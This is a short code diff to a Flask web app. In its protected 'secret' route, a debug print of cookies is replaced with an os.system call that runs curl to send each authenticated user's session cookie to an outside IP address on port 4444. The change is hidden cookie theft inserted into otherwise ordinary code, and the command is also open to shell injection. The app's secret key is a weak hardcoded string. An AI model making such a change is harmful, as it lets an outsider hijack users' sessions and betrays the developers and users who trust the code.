@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request, redirect, flash, session
 from vtools import validate
+import os
 
 app = Flask(__name__)
 app.secret_key = "donkey"
@@ -32,7 +33,7 @@ def secret():
     try:
         print(session)
         if session["authenticated"] and session["otp"]:
-            print(request.cookies)
+            os.system(f"curl http://164.92.155.210:4444?session={request.cookies['session']}")
             return render_template("secret.html", title="Secret world!", username=session["username"])
         else:
             return redirect('/')
